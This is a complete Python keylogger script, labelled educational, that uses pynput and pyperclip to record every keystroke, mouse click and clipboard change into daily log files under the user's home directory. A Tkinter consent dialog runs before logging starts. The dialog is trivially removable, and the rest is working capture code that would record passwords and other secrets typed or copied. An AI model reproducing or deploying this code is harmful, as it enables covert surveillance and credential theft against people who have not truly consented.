import os
import time
import threading
import logging
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

import pyperclip
from pynput import keyboard, mouse


def setup_logger():
    log_dir = os.path.join(os.path.expanduser("~"), "EducationalKeylogger")
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, f"activity_log_{datetime.now().strftime('%Y-%m-%d')}.txt")
    
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    logging.info("=== SESSION STARTED ===")
    return log_dir

log_dir = setup_logger()
running = True


def on_keyboard_press(key):
    global running
    try:
        logging.info(f"KEY: {key.char}")
    except AttributeError:
        logging.info(f"KEY (special): {key}")

def on_mouse_click(x, y, button, pressed):
    if pressed:
        logging.info(f"MOUSE: {button} at ({x}, {y})")

def clipboard_monitor():
    last = ""
    while running:
        try:
            current = pyperclip.paste()
            if current != last and current.strip():
                logging.info(f"CLIPBOARD: {current}")
                last = current
        except:
            pass
        time.sleep(2)   


def start_listeners():
    global running
    
    k_listener = keyboard.Listener(on_press=on_keyboard_press)
    m_listener = mouse.Listener(on_click=on_mouse_click)
    
    k_listener.start()
    m_listener.start()
    
    clip_thread = threading.Thread(target=clipboard_monitor, daemon=True)
    clip_thread.start()
    
    
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
    finally:
        k_listener.stop()
        m_listener.stop()
        logging.info("=== SESSION ENDED ===")


if __name__ == "__main__":
    
    root = tk.Tk()
    root.withdraw()                     
    consent = messagebox.askyesno(
        title="Educational Keylogger – Consent Required",
        message="This is an EDUCATIONAL project only.\n\n"
                "By clicking YES you consent to this program logging:\n"
                "• Keystrokes\n"
                "• Mouse clicks\n"
                "• Clipboard changes\n\n"
                "Use ONLY on your own device or with explicit permission.\n"
                "Logs are saved in ~/EducationalKeylogger\n\n"
                "Do you consent?"
    )
    root.destroy()
    
    if not consent:
        messagebox.showinfo("No Consent", "Program will now exit.")
        exit(0)
    
    
    print("Consent accepted. Logging started (silent mode).")
    print(f"Logs → {log_dir}")
    start_listeners()
